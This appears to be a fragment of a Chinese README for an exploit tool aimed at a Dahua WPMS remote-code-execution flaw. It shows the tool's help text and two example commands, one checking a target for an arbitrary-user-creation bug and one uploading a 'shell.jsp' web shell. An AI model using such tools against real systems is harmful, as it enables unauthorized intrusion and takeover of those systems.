...
Usage of ./DaHuaWPMSinitSessionRCE:
  -f string
    	期望上传的文件，例如：-f shell.jsp
  -h	显示帮助信息
  -p string
    	使用代理，例如: -p http://127.0.0.1:8080
  -t int
    	请求超时时间，例如：-t 20 (default 15)
  -u string
    	目标URL，例如: -u https://example.com
```

检测任意用户创建漏洞。

```bash
$ ./DaHuaWPMSinitSessionRCE -p http://127.0.0.1:8080 -u http://example.com:8881
...
```bash
$ ./DaHuaWPMSinitSessionRCE -p http://127.0.0.1:8080 -u http://example.com:8881 -f shell.jsp                       git:main*
